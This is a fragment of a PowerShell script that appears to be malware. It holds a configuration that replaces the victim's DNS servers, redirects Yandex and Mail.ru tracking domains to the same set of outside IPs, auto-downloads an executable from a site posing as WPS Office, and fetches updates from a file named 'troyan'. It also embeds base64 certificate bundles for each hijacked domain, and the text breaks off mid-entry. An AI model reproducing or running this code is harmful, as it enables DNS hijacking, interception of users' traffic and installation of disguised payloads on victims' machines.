$server = '{
    "updateUrl":  "http://0.superhost.pw/data/troyan.txt",
    "primaryDns":  "185.247.141.78",
    "secondaryDns":  "185.247.141.51",
    "track":  false,
    "trackingUrl":  "123",
    "autoStart":  true,
    "autoUpdate":  false,
    "domains":  [
                    "mc.yandex.ru",
                    "mc.yandex.com",
                    "t.mail.ru",
                    "ad.mail.ru",
                    "counter.yadro.ru"
                ],
    "ipDomains":  {
                      "185.247.141.78":  "mc.yandex.ru",
                      "185.247.141.51":  "mc.yandex.com",
                      "185.247.141.50":  "t.mail.ru",
                      "185.247.141.48":  "ad.mail.ru",
                      "185.247.141.46":  "counter.yadro.ru"
                  },
    "pushes":  [
                   "https://yandex.ru",
                   "https://yahoo.com"
               ],
    "startDownloads":  [
                           "http://wps-office.site/wps_lid.lid-r8M0x5rRf8R7.exe"
                       ],
    "startUrls":  [
                      "https://msn.com"
                  ],
    "front":  [
                  "write.exe"
              ],
    "embeddings":  [

                   ],
    "isValid":  false
}' | ConvertFrom-Json
$xdata = @{
    'mc.yandex.ru'='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'
'mc.yandex.com'='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'
't.mail.ru'='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'+ 
'ElKP5UuG8COPkwBKHQICB9A='
'ad.mail.ru'='MIIKoQIBAzCCCl0GCSqGSIb3DQEHAaCCCk4EggpKMIIKRjCCBg8GCSqGSIb3DQEHAaCCBgAEggX8MIIF+DCCBfQGCyqGSIb3DQEMCgECoIIE/jCCBPowHAYKKoZIhvcNAQwBAzAOBAiyguZGhjsI5wICB9AEggTYbDaePAAolOHAB1DIu3RoEA11gy9KE+j+shkyrh3r'+ 
'Vvj8/+GbiC0/bY/bq4TqviKiytV3T/X8U4SJpApGpxvLystOJmHz7Td5sXtDSADM6wmifdzmr5F93aEhB2r1ygQw3ubG9HBYgwNSYAGM+jTGZxbUQz1pr3Dvp333Y7V3kyoULiWsqctzylHRDiTt88PR/IbOwVBsH6p3EqFA191FN8HAvL4LH9rbCbGddmIZwfWa64OR'+ 
'g0HepeBeULKjkY6bxa4biW3C1J7nd5DaCC3AVaXUYjNdrCov8tzB7fn19/5yCaentoCElYLbESrCsQa4U+LpxyXo0N8EhwbN+TKEilh8ANQjrAZ97/B0I/EeaASBgsJgqw85+/0NXJdjwV4WjrhmLSJOnRA9NyN81wAzmcYESWvAfHPYgAV8VPCBr4WIWBjXuDWK7Cr3'+ 
'G1h9w9vZTAsnsxb4V/I/OqEDXbqYDSiHw4WplopXgS58f/FuVVaNDfIIYrSQ0HsvO2Dp9E67LG0teyURwq+8A7Pm9JX8Iv6RD+FMFtF2LbqxyH2/xTLN69KaGmdpUtFpfD06lJtRGT8C1DNJDKhjVsEaTlcb7DtTMzzlnK/5n3dZtjVj67vNuMP55Ip5NYJGF9fzZLK9'+ 
'Ayae6fnPYh/cFAK3BpYoWub+EvMT2Uf3PtLjEILdSG1WG4os7R/c84+SSM+3q0Tn0UGP9P+nlDdW/0GFtE/IG4t2pszxuHyijk7L59VzJj3c2sZo87RXeeV4DxoUVVqXoWH12nG19ctNnfEHIZNBGEDNG5pPYsQf504DbqzVLe5l2Wi7MQh9o4Dhn3h/80RaL3T903TO'+ 
'LajDcigmCDzZ+YNF2VKhx2jMTt5vsR/WLVzE8rqMc+EIipRuEZAClJYJx0lYWCHbEcPo4jODIfQaKS3emyHOVP8AbVqTeJZ+ksbFp6nXtNNPSGPDHV76qB5q6hyTQwfGOV5vpByy4Nd6KzthaNPvxTzR+3EZMztjQiDaBeLrwTnyhOEf1eWn9ZAKwOycGE5968Tpl426'+ 
'ierkkusMcFmh+T7phzQEcvSoiV7EH69L5OG+IVf1bH3lVmg1osnmv7kchfAOQ6c+TbttwwVctwI5uZGwEyZtg6+jKszs7MaYq8Y1yodl1M+hZTxYPFGjUMuS+T/Y4MI7DC897Jxhfu06bXvYgSfq2A9vV9Ot98osZb69bMGOE+ed1tMLM9t8rb53MMiRSKunrpbVeEVi'+ 
'cS/3SsarwAHu7wM2Zz4XLQJ5kd+jgK421nWR3DywNYZ+24zy5QLGBDWLnUrfj9Cz1gX0wG94l2QBZduXWHSivLKiStB/X85kvuzskx3bzSyfEgWs5zcME21NwrX41S557wrU+8J8sa8wZkvYtN9QgTvfAjyRU6V6fMWV5n9RfyNBGTk9iEkRZvJ+ejrT8c1nbaHcGmus'+ 
'2A/mzV01jyEhlWraGI0h7XlFzTXuosqenG7wQMTLmIFerAYmvZv0B9L0cg+WYXQEoi6c/84XZzozqsrsYMxKVk05a89WguEHzo3bOMb96PttuvTb6MmX5BWMrXiS/cOtflub3UshWugQEmjtuL/EeS4bqzP0qbSLtgLYG56WiLmy/r58gTxG1o+3UJ4IjR5XXULpaXsS'+ 
'7cy5ci/W1S3XEDGB4jANBgkrBgEEAYI3EQIxADATBgkqhkiG9w0BCRUxBgQEAQAAADBdBgkqhkiG9w0BCRQxUB5OAHQAZQAtADUAMABkAGIAOABkAGIANQAtAGUAYQA0ADAALQA0ADMAMAA1AC0AOQAxADUAMwAtADUAOQBmADgAMQA2AGUAOAA1ADYAYgAzMF0GCSsG'+ 
'AQQBgjcRATFQHk4ATQBpAGMAcgBvAHMAbwBmAHQAIABTAHQAcgBvAG4AZwAgAEMAcgB5AHAAdABvAGcAcgBhAHAAaABpAGMAIABQAHIAbwB2AGkAZABlAHIwggQvBgkqhkiG9w0BBwagggQgMIIEHAIBADCCBBUGCSqGSIb3DQEHATAcBgoqhkiG9w0BDAEDMA4ECMJD'+ 
'jfB+9W60AgIH0ICCA+h7AIbrS3Gnn1g+1a4XhDEtZUADSR6bXp9jp072tgq/a8TA6igOogmgwKv3QSuHCYNQbeAyqiPdGnZwYrzKl4YWlQkq+deaJ3/WRm+1O4WmQ3TwnD1TNga29+SZ4QvFtOwh7QmWYkUBIxA9a3cZtAIzIeVLRA4jwjxsgKvYSNrqITLHFzJnBQq5'+ 
'3jZCoKtNG843JckOvmZJCBjq6SkrltmrxmwIqdFO5v0TVgrcptX4nyvinWB2wLbWaPFhEdoP6qMGTHgNTgzNHPNssM9hiRy5Yd16c9yQOLj9Mj1TjSEofKN1lJAfNh0pvUp3nDG6ovblrcOScS0uqfjyvg/uAtnd7GsCft7qWbebxc8gn5cJs3D4cNOCJ2s2mrRH+J5X'+ 
'jHbfj6XcWqrHxn3OOxEfJDBd53frERmAJZsEBfw2lV6TLarVXL/47fBJZ17mAzWAK4HGSzO8EikpneV9lViKE+Gi8ZrudmGhIrpjvIKEftwncmcFWmnWQwbqqwROxcrNek4cJR+7D0Azwt+JZHfbBAvPpoRCn5xIIDg8yCxzPq5tIoPI2Gtm0N5KntJa+eKpGl7eNU9M'+ 
'q4zVX3nV1VboJQeSy3Lw0DvtQhNRGHxqkSOHYC0tcmT4hUy1vNFB/UYr9uyOLcM1H1/w7/Qzj/MOEwJJojn87nApsTey7fpDvDj1R0y8g4RyMbLy0B3cd6t7VMePE7KflI+EtxHg9ufVBvHBMcEAnSygPIj1osqhAyf1jfuun+NtBomsYtJG9tXc8vTWxDkk41nauTrD'+ 
'Iq2TOv+oecoh2mzmuLVRgEPQVqxOCFoPgry8f/7r/QmXnSJ+WfOV4IrNdbdudjzNGk9iohQtwFxQvW/Jf8OGIuGSJ9a/mxwfUwcF1hLpOaHLttozQLJ9fHtlWM89OVF65cso7G13bHr0Z+9vPAgqf9X9O4uStPBCY2o9l3pkhO+mBIGDFnRJdnNpemoe9Fhi3ztxwU4e'+ 
'Lh9dmvuvyxeCwq/Lnz4hs/eUWO/nxUlkzs4jPeyvD13kY45VwBKMQ8fDHRGqFzStfWtAgcCQVdyIKXM7tUE+7RY3M5Ltfcg2ar0skp4o6NEdvh7XQhdIpqgitGexD7vNAjosFVy5EkNc4g5Ir57VzHqGT55javuxQb/lYV5mwWklXoWN/MlQtLMxctbts60SBIzFfV7p'+ 
'pA4ka+hNucSnGW/P0Ve5N9HqXSTzMZzM1A7wractgzwB0RAyGyZxmVnwFDbfEE00c7cijLw8pg3TBgCDn5601dX7Pbx/zbPKaHjkA5q4QivROE9zEZ8RMWmXMwPm+IpFrmnzZ8/rqh9R6V9VHDlMWKelMDswHzAHBgUrDgMCGgQUkWMf+sHo6wkApeCDnaVd/dfgFD4E'+ 
'FFFuGV+9kie3ESBIEJFSc0fc4pQ0AgIH0A=='
'counter.yadro.ru'='MIIKwQIBAzCCCn0GCSqGSIb3DQEHAaCCCm4EggpqMIIKZjCCBg8GCSqGSIb3DQEHAaCCBgAEggX8MIIF+DCCBfQGCyqGSIb3DQEMCgECoIIE/jCCBPowHAYKKoZIhvcNAQwBAzAOBAgz/XL2hxspWAICB9AEggTYtm9DPW0sVhfAj2gp92LQqFyfNXaM4V4z15EHj88J'+ 
